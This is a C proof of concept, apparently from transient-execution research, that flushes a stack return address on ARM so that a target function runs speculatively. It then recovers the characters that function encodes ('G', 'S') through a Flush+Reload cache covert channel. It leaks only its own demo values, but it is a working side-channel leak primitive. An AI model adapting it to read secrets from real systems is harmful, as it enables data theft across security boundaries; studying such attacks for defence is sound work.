#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "libcache/arm_cacheutils.h"

// inaccessible secret
#define SECRET "INACCESSIBLE SECRET"

unsigned char data[128];
int idx;

void gadget() {
  asm volatile("stp x29, x30, [sp, #-16]!");
  asm volatile("mov x29, sp");
  asm volatile("DSB SY\nISB");
  // usleep(100000);
  // volatile int i = 0;
  // for(;i < 10; i++);
  asm volatile("mov x1, sp");
  asm volatile("DC CIVAC, x1");
  asm volatile("ldp x29, x30, [sp], 16");
  // asm volatile("ret");
  // printf("is there\n");
  // int i = 1;
}

void target() {
  cache_encode('G');
  cache_encode('S');
}
int main(int argc, const char **argv) {
  // Detect cache threshold
  if(!CACHE_MISS)
    CACHE_MISS = detect_flush_reload_threshold();
  printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);

  pagesize = sysconf(_SC_PAGESIZE);
  char *_mem = malloc(pagesize * (256 + 4));
  // page aligned
  mem = (char *)(((size_t)_mem & ~(pagesize-1)) + pagesize * 2);
  // initialize memory
  memset(mem, 0, pagesize * 256);

  // flush our shared memory
  flush_shared_memory();
  // nothing leaked so far

  while(1) {
    // for every byte in the string

    flush_shared_memory(); 
    
    gadget();
    // Recover data from covert channel

    for (int i = 0; i < 256; i++) {
      if (flush_reload(mem + i * pagesize)) {
        printf("%d   ", i);
        fflush(stdout);
      }
    }

  }


  return (0);
}
